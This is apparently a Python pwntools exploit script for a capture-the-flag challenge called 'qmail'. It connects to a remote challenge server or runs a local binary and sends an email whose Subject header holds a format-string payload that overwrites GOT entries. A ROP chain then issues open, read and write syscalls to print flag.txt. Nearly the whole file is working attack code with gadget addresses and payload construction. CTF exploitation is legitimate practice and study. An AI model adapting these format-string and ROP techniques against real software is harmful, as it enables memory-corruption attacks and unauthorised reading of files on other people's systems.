#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'qmail.nc.jctf.pro', 1337
binary = './qmail'
brkpts = '''
b *0x403822
b *0x403741
b *0x403b47
b *0x403b64
b *0x40379a
'''

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.27.so'})


fflush_got = 0x60a1a0
getpid_got = 0x60a088
alarm_got = 0x60a110
main = 0x40371e
pop_rdi = 0x4050a6
pop_rsi = 0x403b7c
mov_raxrdi = 0x4040dd
syscall = 0x4031e0 #(alarm plt)
add_rsp = 0x403715 
flag_loc = 0x613490
ret = 0x4004cc
csu1 = 0x4075ba
csu2 = 0x4075a0
bss = 0x60a500
rsp_ret = 0x402fd5
mov_rdirsi = 0x405b46

if __name__ == "__main__":
    payload="""MIME-Version: 1.0
X-Mailer: MailBee.NET 8.0.4.428
Subject: %{}d%76$n%{}d%77$hn%{}d%78$hn%{}d%79$hn
To: user@example.com
Content-Type: multipart/alternative;
boundary="XXXXboundary text"

--XXXXboundary text
--XXXXboundary text--""".format(0x40-0x3f+0x13, 0x3715-0x40, 0x128e5-0x3715, 0x1372d-0x108e5).ljust(0xee,"a")
    payload += "flag.txt".ljust(10,"\x00")
    payload += flat([
        pop_rdi,
        2,
        mov_raxrdi,
        pop_rdi,
        bss-0x20,
        pop_rsi,
        rsp_ret,
        mov_rdirsi,
        csu1,
        0,
        0,
        bss-0x10,
        0,
        0,
        flag_loc-2,
        csu2,
        syscall,
        pop_rdi,
        0,
        mov_raxrdi,
        csu1,
        0,
        0,
        bss-0x10,
        50,
        bss,
        4,
        csu2,
        syscall,
        pop_rdi,
        1,
        mov_raxrdi,
        pop_rsi,
        bss,
        pop_rdi,
        1,
        syscall
    ])
    payload = payload.ljust(0x230, "a")
    payload += p64(getpid_got + 2)
    payload += p64(getpid_got)
    payload += p64(alarm_got)
    payload += p64(fflush_got)
    s(payload)
    #gdb.attach(io, brkpts)
    io.shutdown()
    io.interactive()
